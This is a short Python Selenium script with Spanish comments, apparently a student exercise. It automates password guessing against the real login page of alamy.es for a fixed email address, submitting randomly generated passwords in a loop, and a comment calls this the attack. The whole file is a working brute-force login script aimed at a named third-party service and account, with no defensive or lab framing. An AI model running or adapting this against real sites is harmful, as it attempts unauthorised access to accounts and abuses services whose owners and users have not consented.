import random as rd
#se ocupo selenium
from selenium import webdriver 
letras= 'abcdefghijklmnopqrstuvwxyz'
numeros= '0123456789'
simbolos= '!@#$%^&><'
intentos=10
tamaño= 1
unidos= f'{letras}{numeros}{simbolos}'
#Automatizacion de inicio de sesion (nombre de usuario y contraseña)
driver = webdriver.Chrome("/home/coke/Documentos/Hito2/chromedriver")
#contra= ''.join(rd.sample(unidos,N))
#datos a ingresar      
correo = "yetone7093@eoscast.com "  #nombre de usuario que corresponde al correo
#password = "LA37gl85xp2f" #contraseña, se va ir probando y realizando el ataque 
#pagina
link = "https://www.alamy.es/log-in/"
for i in range(intentos):
    driver.get(link)
    tamaño=rd.randint(1,10)
    contra= ''.join(rd.sample(unidos,tamaño))
    driver.find_element_by_name("email").send_keys(correo)
    driver.find_element_by_name("password").send_keys(contra)
    driver.find_element_by_id("btnIniciarsesión").click()

driver.close()
